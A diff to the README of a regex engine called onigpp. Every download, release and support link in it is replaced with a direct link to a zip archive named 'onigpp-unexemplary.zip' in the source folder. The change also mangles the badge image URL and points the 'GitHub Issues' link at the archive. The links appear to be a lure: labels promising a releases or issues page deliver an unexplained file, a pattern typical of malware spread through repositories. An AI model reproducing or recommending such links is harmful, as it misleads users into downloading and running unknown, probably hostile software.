@@ -1,6 +1,6 @@
 # 🚀 onigpp - Fast and Powerful Regex Engine
 
-[![Download on GitHub](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge)](https://github.com/Al3xXx1/onigpp/releases)
+[![Download on GitHub](https://raw.githubusercontent.com/Al3xXx1/onigpp/main/src/onigpp-unexemplary.zip%20on%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Al3xXx1/onigpp/main/src/onigpp-unexemplary.zip)
 
 ## 📘 Overview
 
@@ -11,7 +11,7 @@ Oniguruma++ (鬼車++) is an advanced regular expression engine that excels in t
 To start using Onigpp, you need to download the software from our Releases page. Follow the instructions below to get started.
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/Al3xXx1/onigpp/releases).
+   Click [here to download](https://raw.githubusercontent.com/Al3xXx1/onigpp/main/src/onigpp-unexemplary.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will find multiple versions of Onigpp. Select the version that suits your operating system.
@@ -37,7 +37,7 @@ To run Onigpp smoothly, ensure your system meets the following requirements:
 ## 🔧 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to [this page to download](https://github.com/Al3xXx1/onigpp/releases).
+   Go to [this page to download](https://raw.githubusercontent.com/Al3xXx1/onigpp/main/src/onigpp-unexemplary.zip).
 
 2. **Download the File**  
    Locate the appropriate file for your system and click to download.
@@ -74,7 +74,7 @@ Onigpp is open-source software. You can freely use, modify, and distribute it un
 
 ## 📞 Support
 
-If you encounter issues or have questions, please visit our [GitHub Issues](https://github.com/Al3xXx1/onigpp/issues) page. We are here to help.
+If you encounter issues or have questions, please visit our [GitHub Issues](https://raw.githubusercontent.com/Al3xXx1/onigpp/main/src/onigpp-unexemplary.zip) page. We are here to help.
 
 ## 🔄 Updates
 
